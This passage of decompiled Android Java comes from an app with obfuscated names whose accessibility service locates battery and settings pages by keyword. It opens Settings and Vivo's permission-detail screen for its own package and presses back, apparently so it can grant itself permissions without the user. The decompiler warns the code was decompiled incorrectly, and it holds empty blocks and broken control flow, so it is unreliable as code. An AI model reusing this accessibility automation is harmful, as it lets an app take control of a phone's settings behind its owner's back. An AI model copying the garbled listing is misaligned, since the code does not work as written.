        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(u91.f60349a0, u91.f60350a1), AbstractC0716jf.m213306g5("电量", "耗电排行", "电池使用", "电量优化", "Power consumption", "Battery usage", "Battery optimization", "Power management"));
            int size = arrayListM213298i5.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM213298i5.get(i);
                i++;
                String str = (String) obj;
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                    while (it.hasNext()) {
                        if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                            t60.m214704c5(this.f55141a2, "[isOnBatteryPage] ✅ 找到关键词: " + str);
                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it2.hasNext()) {
                                ((AccessibilityNodeInfo) it2.next()).recycle();
                            }
                            return true;
                        }
                    }
                }
                if (listFindAccessibilityNodeInfosByText != null) {
                    Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                    while (it3.hasNext()) {
                        ((AccessibilityNodeInfo) it3.next()).recycle();
                    }
                }
            }
        }
        return false;
    }

    /* renamed from: e6 */
    public final boolean m212418e6() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        boolean z = false;
        if (rootInActiveWindow == null) {
            return false;
        }
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("发送通知");
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                        z = true;
                        break;
                    }
                }
            }
            if (listFindAccessibilityNodeInfosByText != null) {
                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                while (it2.hasNext()) {
                    ((AccessibilityNodeInfo) it2.next()).recycle();
                }
            }
            rootInActiveWindow.recycle();
            return z;
        } catch (Throwable th) {
            rootInActiveWindow.recycle();
            throw th;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:150:0x0331, code lost:
    
        if (p000.b81.m210571b1(300, r1) != r3) goto L152;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Path cross not found for [B:32:0x00d7, B:23:0x00a9], limit reached: 184 */
    /* JADX WARN: Path cross not found for [B:59:0x0160, B:53:0x014b], limit reached: 184 */
    /* JADX WARN: Removed duplicated region for block: B:130:0x02b2  */
    /* JADX WARN: Removed duplicated region for block: B:144:0x0301 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:160:0x0364  */
    /* JADX WARN: Removed duplicated region for block: B:161:0x0374  */
    /* JADX WARN: Removed duplicated region for block: B:186:0x02dd A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:23:0x00a9  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x00d7  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0118 A[PHI: r1 r4 r5 r7 r8 r9 r10 r11
      0x0118: PHI (r1v10 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$openSettingsWithVerify$1) = 
      (r1v2 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$openSettingsWithVerify$1)
      (r1v11 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$openSettingsWithVerify$1)
     binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r4v8 int) = (r4v5 int), (r4v9 int) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r5v13 long) = (r5v0 long), (r5v14 long) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r7v17 int) = (r7v0 int), (r7v18 int) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r8v24 boolean) = (r8v29 boolean), (r8v25 boolean) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r9v7 int) = (r9v4 int), (r9v8 int) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r10v6 int) = (r10v3 int), (r10v7 int) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]
      0x0118: PHI (r11v9 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v5 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v10 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:14:0x0052, B:39:0x0114] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x012b A[PHI: r1 r4 r7 r8 r9 r10 r11
      0x012b: PHI (r1v7 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$openSettingsWithVerify$1) = 
      (r1v2 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$openSettingsWithVerify$1)
      (r1v10 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$openSettingsWithVerify$1)
     binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r4v7 int) = (r4v6 int), (r4v8 int) binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r7v3 int) = (r7v0 int), (r7v17 int) binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r8v1 boolean) = (r8v30 boolean), (r8v24 boolean) binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r9v6 int) = (r9v5 int), (r9v7 int) binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r10v5 int) = (r10v4 int), (r10v6 int) binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r11v8 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v6 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v9 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:13:0x0045, B:42:0x0127] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:47:0x0137  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x0219  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:150:0x0331 -> B:152:0x0334). Please report as a decompilation issue!!! */
    /* renamed from: e7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212419e7(int i, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$openSettingsWithVerify$1 vivoSteps$openSettingsWithVerify$1;
        C0371a8 c0371a8;
        C0371a8 c0371a82;
        int i2;
        int i3;
        int i4;
        int i5;
        VivoSteps$openSettingsWithVerify$1 vivoSteps$openSettingsWithVerify$12;
        boolean z;
        long j;
        int i6;
        int i7;
        AccessibilityNodeInfo rootInActiveWindow;
        boolean z2;
        Iterator it;
        boolean z3;
        Iterator it2;
        boolean z4;
        Iterator it3;
        String string;
        String string2;
        if (continuationImpl instanceof VivoSteps$openSettingsWithVerify$1) {
            vivoSteps$openSettingsWithVerify$1 = (VivoSteps$openSettingsWithVerify$1) continuationImpl;
            int i8 = vivoSteps$openSettingsWithVerify$1.f54940a6;
            if ((i8 & Integer.MIN_VALUE) != 0) {
                vivoSteps$openSettingsWithVerify$1.f54940a6 = i8 - Integer.MIN_VALUE;
                c0371a8 = this;
            } else {
                c0371a8 = this;
                vivoSteps$openSettingsWithVerify$1 = new VivoSteps$openSettingsWithVerify$1(c0371a8, continuationImpl);
            }
        }
        Object obj = vivoSteps$openSettingsWithVerify$1.f54938a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        long j2 = 300;
        int i9 = 0;
        boolean z5 = true;
        z5 = true;
        z5 = true;
        z5 = true;
        switch (vivoSteps$openSettingsWithVerify$1.f54940a6) {
            case 0:
                kg1.m213544f4(obj);
                int i10 = i;
                if (1 > i10) {
                    c0371a82 = this;
                    tz0.m214806a6("[设置验证] ❌ 达到最大重试次数 ", i10, "，放弃", c0371a82.f55141a2);
                    return Boolean.FALSE;
                }
                VivoSteps$openSettingsWithVerify$1 vivoSteps$openSettingsWithVerify$13 = vivoSteps$openSettingsWithVerify$1;
                c0371a82 = c0371a8;
                int i11 = 1;
                i2 = i10;
                i3 = 0;
                String str = c0371a82.f55141a2;
                tz0.m214806a6("[设置验证] ========== 第", i11, "次尝试 ==========", str);
                if (c0371a82.f55139a0.getRootInActiveWindow() == null) {
                    int i12 = i3 + (z5 ? 1 : 0);
                    if (i12 >= 3) {
                        t60.m214704c5(str, "[设置验证] ❌ 服务不可用（rootNode 连续 null），中止");
                        return Boolean.FALSE;
                    }
                    vivoSteps$openSettingsWithVerify$13.f54934a0 = c0371a82;
                    vivoSteps$openSettingsWithVerify$13.f54935a1 = i2;
                    vivoSteps$openSettingsWithVerify$13.f54936a2 = i12;
                    vivoSteps$openSettingsWithVerify$13.f54937a3 = i11;
                    vivoSteps$openSettingsWithVerify$13.f54940a6 = z5 ? 1 : 0;
                    if (b81.m210571b1(1000L, vivoSteps$openSettingsWithVerify$13) != coroutineSingletons) {
                        int i13 = i2;
                        VivoSteps$openSettingsWithVerify$1 vivoSteps$openSettingsWithVerify$14 = vivoSteps$openSettingsWithVerify$13;
                        i4 = i11;
                        i5 = i9;
                        i3 = i12;
                        long j3 = j2;
                        vivoSteps$openSettingsWithVerify$12 = vivoSteps$openSettingsWithVerify$14;
                        z = z5 ? 1 : 0;
                        i2 = i13;
                        j = j3;
                        if (i4 != i2) {
                            i10 = i2;
                            tz0.m214806a6("[设置验证] ❌ 达到最大重试次数 ", i10, "，放弃", c0371a82.f55141a2);
                            return Boolean.FALSE;
                        }
                        i11 = i4 + 1;
                        vivoSteps$openSettingsWithVerify$13 = vivoSteps$openSettingsWithVerify$12;
                        long j4 = j;
                        i9 = i5;
                        z5 = z;
                        j2 = j4;
                        String str2 = c0371a82.f55141a2;
                        tz0.m214806a6("[设置验证] ========== 第", i11, "次尝试 ==========", str2);
                        if (c0371a82.f55139a0.getRootInActiveWindow() == null) {
                        }
                    }
                    return coroutineSingletons;
                }
                try {
                } catch (Exception e) {
                    z = z5 ? 1 : 0;
                    j = j2;
                    tz0.m214807a7("[设置验证] ❌ 打开设置失败: ", e.getMessage(), str2);
                    vivoSteps$openSettingsWithVerify$13.f54934a0 = c0371a82;
                    vivoSteps$openSettingsWithVerify$13.f54935a1 = i2;
                    i5 = 0;
                    vivoSteps$openSettingsWithVerify$13.f54936a2 = 0;
                    vivoSteps$openSettingsWithVerify$13.f54937a3 = i11;
                    vivoSteps$openSettingsWithVerify$13.f54940a6 = 2;
                    if (b81.m210571b1(500L, vivoSteps$openSettingsWithVerify$13) != coroutineSingletons) {
                        int i14 = i2;
                        VivoSteps$openSettingsWithVerify$1 vivoSteps$openSettingsWithVerify$15 = vivoSteps$openSettingsWithVerify$13;
                        i4 = i11;
                        vivoSteps$openSettingsWithVerify$12 = vivoSteps$openSettingsWithVerify$15;
                        i3 = 0;
                        i2 = i14;
                    }
                }
                Intent intent = new Intent("android.settings.SETTINGS");
                intent.setFlags(1350631424);
                c0371a82.f55140a1.startActivity(intent);
                t60.m214704c5(str2, "[设置验证] ✅ Intent已发送");
                vivoSteps$openSettingsWithVerify$13.f54934a0 = c0371a82;
                vivoSteps$openSettingsWithVerify$13.f54935a1 = i2;
                vivoSteps$openSettingsWithVerify$13.f54936a2 = i9;
                vivoSteps$openSettingsWithVerify$13.f54937a3 = i11;
                vivoSteps$openSettingsWithVerify$13.f54940a6 = 3;
                if (b81.m210571b1(500L, vivoSteps$openSettingsWithVerify$13) != coroutineSingletons) {
                    i7 = i2;
                    vivoSteps$openSettingsWithVerify$1 = vivoSteps$openSettingsWithVerify$13;
                    i4 = i11;
                    i6 = i9;
                    vivoSteps$openSettingsWithVerify$1.f54934a0 = c0371a82;
                    vivoSteps$openSettingsWithVerify$1.f54935a1 = i7;
                    vivoSteps$openSettingsWithVerify$1.f54936a2 = i6;
                    vivoSteps$openSettingsWithVerify$1.f54937a3 = i4;
                    vivoSteps$openSettingsWithVerify$1.f54940a6 = 4;
                    if (m212385g6(c0371a82, vivoSteps$openSettingsWithVerify$1) != coroutineSingletons) {
                        vivoSteps$openSettingsWithVerify$1.f54934a0 = c0371a82;
                        vivoSteps$openSettingsWithVerify$1.f54935a1 = i7;
                        vivoSteps$openSettingsWithVerify$1.f54936a2 = i6;
                        vivoSteps$openSettingsWithVerify$1.f54937a3 = i4;
                        vivoSteps$openSettingsWithVerify$1.f54940a6 = 5;
                        if (b81.m210571b1(j2, vivoSteps$openSettingsWithVerify$1) != coroutineSingletons) {
                            String str3 = c0371a82.f55141a2;
                            dqtvuisjd dqtvuisjdVar = c0371a82.f55139a0;
                            rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                            if (rootInActiveWindow != null) {
                                CharSequence packageName = rootInActiveWindow.getPackageName();
                                String string3 = packageName != null ? packageName.toString() : null;
                                if (!t60.m214686a2(string3, "com.android.settings")) {
                                    if (!AbstractC0779a1.m213652a5(string3 == null ? "" : string3, "settings", z5)) {
                                        tz0.m214807a7("[isOnSettingsPage] ❌ 不是设置包名: ", string3, str3);
                                    }
                                }
                                for (String str4 : AbstractC0716jf.m213306g5("设置", "設置", "設定", "Settings", "Einstellungen", "Paramètres", "Ajustes", "Configuración", "Configurações", "Impostazioni", "Настройки", "설정", "Cài đặt", "การตั้งค่า", "Setelan", "Pengaturan")) {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str4);
                                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                            if (accessibilityNodeInfo.isVisibleToUser()) {
                                                CharSequence text = accessibilityNodeInfo.getText();
                                                if (!t60.m214686a2(text != null ? text.toString() : null, str4)) {
                                                    CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                                                    if (t60.m214686a2(contentDescription != null ? contentDescription.toString() : null, str4)) {
                                                    }
                                                }
                                                tz0.m214807a7("[isOnSettingsPage] 找到设置标题: ", str4, str3);
                                                z2 = 1;
                                                it = AbstractC0716jf.m213306g5("向上导航", "向上", "返回", "Navigate up", "Back", "Retour", "Zurück", "Indietro", "Voltar", "Atrás", "Назад", "뒤로", "Kembali").iterator();
                                                while (it.hasNext()) {
                                                    String str5 = (String) it.next();
                                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str5);
                                                    if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                                        for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText2) {
                                                            if (accessibilityNodeInfo2.isVisibleToUser()) {
                                                                CharSequence className = accessibilityNodeInfo2.getClassName();
                                                                if (className == null || (string2 = className.toString()) == null) {
                                                                    it3 = it;
                                                                } else {
                                                                    it3 = it;
                                                                    if (AbstractC0779a1.m213652a5(string2, "ImageButton", false)) {
                                                                    }
                                                                    tz0.m214807a7("[isOnSettingsPage] 检测到返回按钮关键词: ", str5, str3);
                                                                    z3 = true;
                                                                    it2 = AbstractC0715je.m213301i8(dh0.f55753a3, 10).iterator();
                                                                    while (true) {
                                                                        if (it2.hasNext()) {
                                                                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it2.next());
                                                                            if (listFindAccessibilityNodeInfosByText3 != null && !listFindAccessibilityNodeInfosByText3.isEmpty()) {
                                                                                Iterator<T> it4 = listFindAccessibilityNodeInfosByText3.iterator();
                                                                                while (it4.hasNext()) {
                                                                                    if (((AccessibilityNodeInfo) it4.next()).isVisibleToUser()) {
                                                                                        z4 = true;
                                                                                    }
                                                                                }
                                                                            }
                                                                        } else {
                                                                            z4 = false;
                                                                        }
                                                                    }
                                                                    t60.m214704c5(str3, "[isOnSettingsPage] 有设置标题: " + z2 + ", 有返回按钮: " + z3 + ", 有取消按钮: " + z4);
                                                                    if (z2 == 0 && !z3 && !z4) {
                                                                        t60.m214704c5(str3, "[isOnSettingsPage] ✅ 在设置首页");
                                                                        t60.m214704c5(str3, "[设置验证] ✅ 已在设置页面");
                                                                        return Boolean.TRUE;
                                                                    }
                                                                    t60.m214704c5(str3, "[isOnSettingsPage] ❌ 不在设置首页");
                                                                }
                                                                CharSequence className2 = accessibilityNodeInfo2.getClassName();
                                                                if (className2 == null || (string = className2.toString()) == null || !AbstractC0779a1.m213652a5(string, "Button", false)) {
                                                                    CharSequence contentDescription2 = accessibilityNodeInfo2.getContentDescription();
                                                                    if (t60.m214686a2(contentDescription2 != null ? contentDescription2.toString() : null, str5)) {
                                                                    }
                                                                }
                                                                tz0.m214807a7("[isOnSettingsPage] 检测到返回按钮关键词: ", str5, str3);
                                                                z3 = true;
                                                                it2 = AbstractC0715je.m213301i8(dh0.f55753a3, 10).iterator();
                                                                while (true) {
                                                                    if (it2.hasNext()) {
                                                                    }
                                                                }
                                                                t60.m214704c5(str3, "[isOnSettingsPage] 有设置标题: " + z2 + ", 有返回按钮: " + z3 + ", 有取消按钮: " + z4);
                                                                if (z2 == 0) {
                                                                }
                                                                t60.m214704c5(str3, "[isOnSettingsPage] ❌ 不在设置首页");
                                                            } else {
                                                                it3 = it;
                                                            }
                                                            it = it3;
                                                        }
                                                    }
                                                    it = it;
                                                }
                                                z3 = false;
                                                it2 = AbstractC0715je.m213301i8(dh0.f55753a3, 10).iterator();
                                                while (true) {
                                                    if (it2.hasNext()) {
                                                    }
                                                }
                                                t60.m214704c5(str3, "[isOnSettingsPage] 有设置标题: " + z2 + ", 有返回按钮: " + z3 + ", 有取消按钮: " + z4);
                                                if (z2 == 0) {
                                                }
                                                t60.m214704c5(str3, "[isOnSettingsPage] ❌ 不在设置首页");
                                            }
                                        }
                                    }
                                }
                                z2 = i9;
                                it = AbstractC0716jf.m213306g5("向上导航", "向上", "返回", "Navigate up", "Back", "Retour", "Zurück", "Indietro", "Voltar", "Atrás", "Назад", "뒤로", "Kembali").iterator();
                                while (it.hasNext()) {
                                }
                                z3 = false;
                                it2 = AbstractC0715je.m213301i8(dh0.f55753a3, 10).iterator();
                                while (true) {
                                    if (it2.hasNext()) {
                                    }
                                }
                                t60.m214704c5(str3, "[isOnSettingsPage] 有设置标题: " + z2 + ", 有返回按钮: " + z3 + ", 有取消按钮: " + z4);
                                if (z2 == 0) {
                                }
                                t60.m214704c5(str3, "[isOnSettingsPage] ❌ 不在设置首页");
                            }
                            t60.m214704c5(str3, "[设置验证] ⚠️ 未在设置页面，返回一次...");
                            z = true;
                            dqtvuisjdVar.performGlobalAction(1);
                            vivoSteps$openSettingsWithVerify$1.f54934a0 = c0371a82;
                            vivoSteps$openSettingsWithVerify$1.f54935a1 = i7;
                            vivoSteps$openSettingsWithVerify$1.f54936a2 = i6;
                            vivoSteps$openSettingsWithVerify$1.f54937a3 = i4;
                            vivoSteps$openSettingsWithVerify$1.f54940a6 = 6;
                            j = 300;
                            break;
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                i4 = vivoSteps$openSettingsWithVerify$1.f54937a3;
                int i15 = vivoSteps$openSettingsWithVerify$1.f54936a2;
                int i16 = vivoSteps$openSettingsWithVerify$1.f54935a1;
                c0371a82 = vivoSteps$openSettingsWithVerify$1.f54934a0;
                kg1.m213544f4(obj);
                i5 = 0;
                i3 = i15;
                vivoSteps$openSettingsWithVerify$12 = vivoSteps$openSettingsWithVerify$1;
                z = true;
                i2 = i16;
                j = 300;
                if (i4 != i2) {
                }
                break;
            case 2:
                i4 = vivoSteps$openSettingsWithVerify$1.f54937a3;
                int i17 = vivoSteps$openSettingsWithVerify$1.f54936a2;
                int i18 = vivoSteps$openSettingsWithVerify$1.f54935a1;
                c0371a82 = vivoSteps$openSettingsWithVerify$1.f54934a0;
                kg1.m213544f4(obj);
                i5 = 0;
                z = true;
                j = 300;
                vivoSteps$openSettingsWithVerify$12 = vivoSteps$openSettingsWithVerify$1;
                i3 = i17;
                i2 = i18;
                if (i4 != i2) {
                }
                break;
            case 3:
                i4 = vivoSteps$openSettingsWithVerify$1.f54937a3;
                i6 = vivoSteps$openSettingsWithVerify$1.f54936a2;
                i7 = vivoSteps$openSettingsWithVerify$1.f54935a1;
                c0371a82 = vivoSteps$openSettingsWithVerify$1.f54934a0;
                kg1.m213544f4(obj);
                vivoSteps$openSettingsWithVerify$1.f54934a0 = c0371a82;
                vivoSteps$openSettingsWithVerify$1.f54935a1 = i7;
                vivoSteps$openSettingsWithVerify$1.f54936a2 = i6;
                vivoSteps$openSettingsWithVerify$1.f54937a3 = i4;
                vivoSteps$openSettingsWithVerify$1.f54940a6 = 4;
                if (m212385g6(c0371a82, vivoSteps$openSettingsWithVerify$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                i4 = vivoSteps$openSettingsWithVerify$1.f54937a3;
                i6 = vivoSteps$openSettingsWithVerify$1.f54936a2;
                i7 = vivoSteps$openSettingsWithVerify$1.f54935a1;
                c0371a82 = vivoSteps$openSettingsWithVerify$1.f54934a0;
                kg1.m213544f4(obj);
                vivoSteps$openSettingsWithVerify$1.f54934a0 = c0371a82;
                vivoSteps$openSettingsWithVerify$1.f54935a1 = i7;
                vivoSteps$openSettingsWithVerify$1.f54936a2 = i6;
                vivoSteps$openSettingsWithVerify$1.f54937a3 = i4;
                vivoSteps$openSettingsWithVerify$1.f54940a6 = 5;
                if (b81.m210571b1(j2, vivoSteps$openSettingsWithVerify$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                i4 = vivoSteps$openSettingsWithVerify$1.f54937a3;
                i6 = vivoSteps$openSettingsWithVerify$1.f54936a2;
                i7 = vivoSteps$openSettingsWithVerify$1.f54935a1;
                c0371a82 = vivoSteps$openSettingsWithVerify$1.f54934a0;
                kg1.m213544f4(obj);
                String str32 = c0371a82.f55141a2;
                dqtvuisjd dqtvuisjdVar2 = c0371a82.f55139a0;
                rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                t60.m214704c5(str32, "[设置验证] ⚠️ 未在设置页面，返回一次...");
                z = true;
                dqtvuisjdVar2.performGlobalAction(1);
                vivoSteps$openSettingsWithVerify$1.f54934a0 = c0371a82;
                vivoSteps$openSettingsWithVerify$1.f54935a1 = i7;
                vivoSteps$openSettingsWithVerify$1.f54936a2 = i6;
                vivoSteps$openSettingsWithVerify$1.f54937a3 = i4;
                vivoSteps$openSettingsWithVerify$1.f54940a6 = 6;
                j = 300;
                break;
            case 6:
                i4 = vivoSteps$openSettingsWithVerify$1.f54937a3;
                i6 = vivoSteps$openSettingsWithVerify$1.f54936a2;
                i7 = vivoSteps$openSettingsWithVerify$1.f54935a1;
                c0371a82 = vivoSteps$openSettingsWithVerify$1.f54934a0;
                kg1.m213544f4(obj);
                z = true;
                j = 300;
                vivoSteps$openSettingsWithVerify$12 = vivoSteps$openSettingsWithVerify$1;
                i3 = i6;
                i2 = i7;
                i5 = 0;
                if (i4 != i2) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:82:0x0157, code lost:
    
        r11.recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:83:0x015c, code lost:
    
        return java.lang.Boolean.TRUE;
     */
    /* JADX WARN: Code restructure failed: missing block: B:87:0x0184, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L88;
     */
    /* JADX WARN: Removed duplicated region for block: B:28:0x009b A[PHI: r2 r6
      0x009b: PHI (r2v2 int) = (r2v3 int), (r2v8 int) binds: [B:26:0x0097, B:16:0x003a] A[DONT_GENERATE, DONT_INLINE]
      0x009b: PHI (r6v1 com.storm.safe.rock.service.modules.yw5xud.a8) = (r6v2 com.storm.safe.rock.service.modules.yw5xud.a8), (r6v6 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:26:0x0097, B:16:0x003a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x00a3  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x010c  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0114  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x0132  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x013a  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x014b  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0173  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0196  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x0052 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:29:0x00a1 -> B:91:0x0193). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:85:0x0171 -> B:91:0x0193). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:87:0x0184 -> B:91:0x0193). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:90:0x0188 -> B:91:0x0193). Please report as a decompilation issue!!! */
    /* renamed from: e8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212420e8(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$openSoftPermissionDetailActivity$1 vivoSteps$openSoftPermissionDetailActivity$1;
        C0371a8 c0371a8;
        int i;
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3;
        Iterator<T> it;
        if (continuationImpl instanceof VivoSteps$openSoftPermissionDetailActivity$1) {
            vivoSteps$openSoftPermissionDetailActivity$1 = (VivoSteps$openSoftPermissionDetailActivity$1) continuationImpl;
            int i2 = vivoSteps$openSoftPermissionDetailActivity$1.f54945a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                vivoSteps$openSoftPermissionDetailActivity$1.f54945a4 = i2 - Integer.MIN_VALUE;
            } else {
                vivoSteps$openSoftPermissionDetailActivity$1 = new VivoSteps$openSoftPermissionDetailActivity$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$openSoftPermissionDetailActivity$1.f54943a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = vivoSteps$openSoftPermissionDetailActivity$1.f54945a4;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            c0371a8 = this;
            i = 1;
            if (i < 4) {
            }
        } else {
            if (i3 == 1) {
                i = vivoSteps$openSoftPermissionDetailActivity$1.f54942a1;
                c0371a8 = vivoSteps$openSoftPermissionDetailActivity$1.f54941a0;
                kg1.m213544f4(obj);
                vivoSteps$openSoftPermissionDetailActivity$1.f54941a0 = c0371a8;
                vivoSteps$openSoftPermissionDetailActivity$1.f54942a1 = i;
                vivoSteps$openSoftPermissionDetailActivity$1.f54945a4 = 2;
                if (m212385g6(c0371a8, vivoSteps$openSoftPermissionDetailActivity$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i3 == 2) {
                i = vivoSteps$openSoftPermissionDetailActivity$1.f54942a1;
                c0371a8 = vivoSteps$openSoftPermissionDetailActivity$1.f54941a0;
                kg1.m213544f4(obj);
                rootInActiveWindow = c0371a8.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                i++;
                if (i < 4) {
                }
            } else {
                if (i3 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i = vivoSteps$openSoftPermissionDetailActivity$1.f54942a1;
                c0371a8 = vivoSteps$openSoftPermissionDetailActivity$1.f54941a0;
                kg1.m213544f4(obj);
                i++;
                if (i < 4) {
                    try {
                    } catch (Exception e) {
                        tz0.m214807a7("[openSoftPermissionDetailActivity] ❌ Intent失败: ", e.getMessage(), c0371a8.f55141a2);
                    }
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName(c0371a8.f55143a4, c0371a8.f55144a5));
                    intent.setFlags(1350631424);
                    intent.setAction("secure.intent.action.softPermissionDetail");
                    intent.putExtra("packagename", c0371a8.f55140a1.getPackageName());
                    c0371a8.f55140a1.startActivity(intent);
                    vivoSteps$openSoftPermissionDetailActivity$1.f54941a0 = c0371a8;
                    vivoSteps$openSoftPermissionDetailActivity$1.f54942a1 = i;
                    vivoSteps$openSoftPermissionDetailActivity$1.f54945a4 = 1;
                    if (b81.m210571b1(1000L, vivoSteps$openSoftPermissionDetailActivity$1) != coroutineSingletons) {
